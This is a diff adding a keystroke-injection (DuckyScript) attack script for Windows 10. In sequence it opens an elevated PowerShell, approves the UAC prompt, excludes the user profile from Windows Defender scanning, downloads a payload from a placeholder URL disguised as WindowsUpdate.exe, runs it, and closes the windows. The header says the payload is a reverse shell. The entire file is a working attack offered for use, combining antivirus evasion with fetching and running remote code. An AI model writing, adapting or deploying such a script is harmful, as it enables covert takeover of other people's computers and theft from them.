@@ -1,0 +1,30 @@
+REM Windows Defender ExclusionPath + ReverseShell
+REM Tested on Windows 10 Version 21H1(OS Build 19043.1348)
+REM ============================================================================
+DELAY 2000
+CTRL esc
+STRING PowerShell
+DELAY 500
+ENTER
+DELAY 500
+STRING start-process PowerShell -verb runas
+DELAY 500
+ENTER
+DELAY 500
+ALT y
+DELAY 500
+STRING cd $env:userprofile
+ENTER
+STRING Set-MpPreference -ExclusionPath $env:userprofile
+ENTER
+DELAY 500
+STRING wget <URL Payload> -OutFile WindowsUpdate.exe
+ENTER
+DELAY 500
+STRING .\WindowsUpdate.exe
+ENTER
+STRING exit
+ENTER
+DELAY 500
+STRING exit
+ENTER
